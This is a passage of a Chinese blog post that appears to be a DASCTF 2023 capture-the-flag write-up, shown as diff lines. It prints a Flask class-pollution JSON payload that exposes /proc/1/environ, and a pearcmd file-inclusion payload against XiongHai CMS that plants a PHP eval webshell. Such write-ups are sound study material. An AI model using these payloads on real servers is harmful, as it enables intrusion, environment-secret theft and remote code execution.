+<p><code>_static_folder</code>即静态文件的位置，我们正常只能访问这个位置下的所有文件</p>
+</blockquote>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init\u005f_"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token property">"username"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+<span class="token property">"password"</span><span class="token operator">:</span><span class="token number">1</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;environ获取环境变量</p>
+<hr>
+<h1 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h1><blockquote>
+<p>熊海cms+pearcmd</p>
+</blockquote>
+<p>可以参考<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE">y4爷的博客</a></p>
+<p>这题我一开始能找到任意文件读取、sql注入和垂直越权的漏洞，但是没啥用，后台文件上传也传不进马</p>
+<p>这里利用到的是前台文件包含实现RCE的方法：<a href="https://c1oudfl0w0.github.io/blog/2023/07/25/LFI%E5%8C%85%E5%90%ABpearcmd-php%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">pearcmd</a></p>
+<p>在熊海CMS的入口文件index.php处存在文件包含</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//单一入口模式</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关闭错误显示</span>
+<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//接收文件名</span>
+<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string single-quoted-string">''</span><span class="token operator">?</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment">//判断为空或者等于index</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'files/'</span><span class="token operator">.</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//载入相应文件</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意，在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</p>
+<p>这个老CMS一定是php5版本，所以存在pearcmd</p>
+<p>那么接下来就是最麻烦的问题了：这个pearcmd的路径不在&#x2F;usr&#x2F;local下而是在&#x2F;usr&#x2F;share下，比赛时这里能卡不少时间</p>
+<p>知道位置接下来就是payload随便打了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">?+config-create+/&amp;r=../../../../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>+/tmp/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230804190905501.png" alt="image-20230804190905501"></p>
+<p>再文件包含执行一句话木马即可</p>
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230804191652987.png" alt="image-20230804191652987"></p>
+<hr>
+<h1 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h1>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
